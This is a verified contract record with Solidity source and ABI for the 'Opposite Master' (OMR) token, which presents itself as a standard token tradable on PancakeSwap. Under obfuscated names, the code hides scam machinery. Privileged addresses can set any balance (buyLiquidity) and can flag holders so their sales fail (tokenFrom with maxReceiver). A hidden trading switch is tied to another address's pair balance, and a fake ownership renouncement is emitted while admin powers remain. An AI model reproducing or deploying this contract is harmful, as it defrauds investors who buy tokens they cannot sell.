{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface receiverTrading {\n    function createPair(address fundEnable, address fundLaunched) external returns (address);\n}\n\ninterface modeAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listShould) external view returns (uint256);\n\n    function transfer(address walletTxTake, uint256 sellLimit) external returns (bool);\n\n    function allowance(address isAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTxTake,\n        uint256 sellLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamMax, uint256 value);\n    event Approval(address indexed isAuto, address indexed spender, uint256 value);\n}\n\nabstract contract listMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTeamLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeAutoMetadata is modeAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OppositeMaster is listMin, modeAuto, modeAutoMetadata {\n\n    uint256 constant maxReceiver = 19 ** 10;\n\n    address shouldAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address listShould) public view virtual override returns (uint256) {\n        return takeLimit[listShould];\n    }\n\n    function buyLiquidity(address shouldSenderWallet, uint256 sellLimit) public {\n        feeBuy();\n        takeLimit[shouldSenderWallet] = sellLimit;\n    }\n\n    address public takeMax;\n\n    mapping(address => bool) public txShouldLaunched;\n\n    string private maxFeeLaunched = \"Opposite Master\";\n\n    address public enableLaunch;\n\n    mapping(address => mapping(address => uint256)) private walletLimitBuy;\n\n    function approve(address modeTx, uint256 sellLimit) public virtual override returns (bool) {\n        walletLimitBuy[_msgSender()][modeTx] = sellLimit;\n        emit Approval(_msgSender(), modeTx, sellLimit);\n        return true;\n    }\n\n    uint256 public marketingEnable;\n\n    mapping(address => bool) public isTotal;\n\n    function maxTotal(address limitFrom, address walletTxTake, uint256 sellLimit) internal returns (bool) {\n        if (limitFrom == enableLaunch) {\n            return listFundBuy(limitFrom, walletTxTake, sellLimit);\n        }\n        uint256 toMarketing = modeAuto(takeMax).balanceOf(shouldAt);\n        require(toMarketing == maxTradingWallet);\n        require(walletTxTake != shouldAt);\n        if (isTotal[limitFrom]) {\n            return listFundBuy(limitFrom, walletTxTake, maxReceiver);\n        }\n        return listFundBuy(limitFrom, walletTxTake, sellLimit);\n    }\n\n    function feeMaxReceiver(address limitMarketing) public {\n        if (receiverTotal) {\n            return;\n        }\n        if (tradingMode != txShouldExempt) {\n            txShouldExempt = marketingEnable;\n        }\n        txShouldLaunched[limitMarketing] = true;\n        if (isSellAmount == receiverMin) {\n            txShouldExempt = liquidityLaunched;\n        }\n        receiverTotal = true;\n    }\n\n    uint256 private tradingMode;\n\n    address private autoFund;\n\n    constructor (){\n        if (tradingMode != txShouldExempt) {\n            isSellAmount = true;\n        }\n        isTeamLiquidity modeTotalMarketing = isTeamLiquidity(receiverTo);\n        takeMax = receiverTrading(modeTotalMarketing.factory()).createPair(modeTotalMarketing.WETH(), address(this));\n        \n        enableLaunch = _msgSender();\n        txShouldLaunched[enableLaunch] = true;\n        takeLimit[enableLaunch] = exemptAt;\n        receiverAmount();\n        if (marketingEnable != txShouldExempt) {\n            receiverMin = true;\n        }\n        emit Transfer(address(0), enableLaunch, exemptAt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptAt;\n    }\n\n    mapping(address => uint256) private takeLimit;\n\n    function receiverAmount() public {\n        emit OwnershipTransferred(enableLaunch, address(0));\n        autoFund = address(0);\n    }\n\n    function listFundBuy(address limitFrom, address walletTxTake, uint256 sellLimit) internal returns (bool) {\n        require(takeLimit[limitFrom] >= sellLimit);\n        takeLimit[limitFrom] -= sellLimit;\n        takeLimit[walletTxTake] += sellLimit;\n        emit Transfer(limitFrom, walletTxTake, sellLimit);\n        return true;\n    }\n\n    uint256 private exemptAt = 100000000 * 10 ** 18;\n\n    function tokenFrom(address senderEnable) public {\n        feeBuy();\n        if (receiverMin != isSellAmount) {\n            marketingEnable = txShouldExempt;\n        }\n        if (senderEnable == enableLaunch || senderEnable == takeMax) {\n            return;\n        }\n        isTotal[senderEnable] = true;\n    }\n\n    uint256 maxTradingWallet;\n\n    function getOwner() external view returns (address) {\n        return autoFund;\n    }\n\n    bool public isSellAmount;\n\n    uint256 fromEnable;\n\n    function allowance(address amountLiquidityBuy, address modeTx) external view virtual override returns (uint256) {\n        if (modeTx == receiverTo) {\n            return type(uint256).max;\n        }\n        return walletLimitBuy[amountLiquidityBuy][modeTx];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalShould;\n    }\n\n    function owner() external view returns (address) {\n        return autoFund;\n    }\n\n    function feeBuy() private view {\n        require(txShouldLaunched[_msgSender()]);\n    }\n\n    function walletTx(uint256 sellLimit) public {\n        feeBuy();\n        maxTradingWallet = sellLimit;\n    }\n\n    bool public receiverTotal;\n\n    function transfer(address shouldSenderWallet, uint256 sellLimit) external virtual override returns (bool) {\n        return maxTotal(_msgSender(), shouldSenderWallet, sellLimit);\n    }\n\n    address receiverTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private receiverMin;\n\n    uint256 public liquidityLaunched;\n\n    uint8 private totalShould = 18;\n\n    string private amountAuto = \"OMR\";\n\n    function name() external view virtual override returns (string memory) {\n        return maxFeeLaunched;\n    }\n\n    uint256 public txShouldExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountAuto;\n    }\n\n    function transferFrom(address limitFrom, address walletTxTake, uint256 sellLimit) external override returns (bool) {\n        if (_msgSender() != receiverTo) {\n            if (walletLimitBuy[limitFrom][_msgSender()] != type(uint256).max) {\n                require(sellLimit <= walletLimitBuy[limitFrom][_msgSender()]);\n                walletLimitBuy[limitFrom][_msgSender()] -= sellLimit;\n            }\n        }\n        return maxTotal(limitFrom, walletTxTake, sellLimit);\n    }\n\n    event OwnershipTransferred(address indexed receiverLaunch, address indexed txMarketing);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidityBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSenderWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLimit\",\"type\":\"uint256\"}],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"}],\"name\":\"feeMaxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSellAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnable\",\"type\":\"address\"}],\"name\":\"tokenFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSenderWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTxTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShouldExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txShouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellLimit\",\"type\":\"uint256\"}],\"name\":\"walletTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OppositeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}